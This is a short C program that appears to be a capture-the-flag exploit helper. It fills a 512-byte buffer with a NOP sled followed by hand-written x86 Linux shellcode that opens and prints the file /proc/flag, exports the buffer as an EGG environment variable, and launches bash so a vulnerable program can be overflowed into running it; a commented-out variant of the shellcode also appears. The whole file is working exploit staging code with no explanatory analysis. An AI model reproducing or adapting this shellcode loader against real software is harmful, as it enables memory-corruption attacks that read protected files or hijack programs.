#include <unistd.h>
#define NOP 0x90
 
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xe8\x0b\x00\x00\x00\x2f\x70"
"\x72\x6f\x63\x2f\x66\x6c\x61\x67\x00\x5b\xb0\x5b\xb0\x05\xcd"
"\x80\x89\xc6\xe8\x00\x00\x00\x00\x89\xf3\xb0\x03\x83\xec\x01"
"\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xd2\x39\xc2\x74\x11\xeb\x00"
"\x31\xc0\x31\xdb\xb2\x01\xb0\x04\xcd\x80\x83\xc4\x01\xeb\xdb"
"\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
/*
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xe8\x0b\x2f\x70\x72\x6f\x63"
"\x2f\x66\x6c\x61\x67\x5b\xb0\x5b\xb0\x05\xcd\x80\x89\xc6\xe8"
"\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31"
"\xd2\x39\xc2\x74\x11\xeb\x31\xc0\x31\xdb\xb2\x01\xb0\x04\xcd"
"\x80\x83\xc4\x01\xeb\xdb\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0"
"\x01\x31\xdb\xcd\x80";
*/
 
int main(void)
{
  char shell[512];
 
  puts("Eggshell loaded into environment.\n");
  memset(shell,NOP,512);     /* fill-up the buffer with NOP */
/* fill-up the shellcode on the second half to the end of buffer */
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  /* set the environment variable to */
  /* EGG and shell as its value, rewrite if needed */
  setenv("EGG", shell, 1);
  /* modify the variable */
  putenv(shell);
  /* invoke the bash */
  system("bash");
  return 0;
}
